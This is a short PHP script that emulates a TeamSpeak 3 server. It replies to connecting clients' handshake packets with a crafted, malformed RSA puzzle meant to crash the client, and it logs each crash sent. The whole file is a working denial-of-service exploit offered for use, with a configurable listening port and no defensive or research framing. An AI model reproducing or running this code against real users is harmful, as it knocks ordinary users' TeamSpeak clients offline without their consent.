<?php
#This script emulates a TS3 Server and sends the connecting client an RSA puzzle which it cannot solve
#Tested on PHP 5 and PHP 7
#License: GNU GPL (GENERAL PUBLIC LICENSE) v3.0
#Developer: The Beast MC
#For questions you can contact me on ts-thebeast.net

### CONFIG ###

$port = 9987; #port to listen on

### CONFIG END ###

### DO NOT MODIFY ANYTHING UNDER HERE UNLESS YOU KNOW WHAT YOU DO ###

$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
if (socket_bind($socket, '0.0.0.0', $port) === false) {
    exit("socket_bind() failed. Reason: " . socket_strerror(socket_last_error($socket))."\n");
}
echo 'TS3 Server started successfully. Listening for connections ...'."\n";
while (1) {
	socket_recvfrom($socket, $buf, 1000, 0, $clientaddress, $clientport);
	$response = bin2hex($buf);
	if (strlen($response) == 68 and substr($response,0,26) == '545333494e4954310065000088') {
		$response = hex2bin('545333494e495431006588010200000000000000000000000000000000000000');
		socket_sendto($socket, $response, 1000, 0, $clientaddress, $clientport);
	} elseif (strlen($response) == 76 and substr($response,0,26) == '545333494e4954310065000088') {
		$response = '545333494e49543100658803ffED1eBAACDe66bd212F3B91A0C1dbd65b374F1FCEe353A74C78eB99B5b8B2e0eC7DC9Ce7bCdfcFE97622AbD015B4EBCB3fecc7D23bBfaA2B15DBBBBC1d009DBcd924B06Eb2e0CBCD0AfBbadc2ecbb812C47d5dcAA4BcFdaF73ACe89A106c98f6c0DBeac8e8FeF9d6d836Bd1Cd791f376452Cff581400ed760acB2deAE1Be53E98152AbaBfaC823e3e4FACdaAf69E977C8dE328ECDA5FEE3c327FfCf9228caf8D761aeF7bAdbebe5eAcda87Eba61F09D7AEC9D4EeBa763cFE3c9cE718d37dd4F73CA10ffB4127d15Bee7cF9Edc644b4be06f0F9C4aEb2FBDd9549e215959FaFea57b5B7900000000';
		socket_sendto($socket, hex2bin($response), 1000, 0, $clientaddress, $clientport);
		echo 'sent rsa puzzle crash to '.$clientaddress.':'.$clientport."\n";
	}
}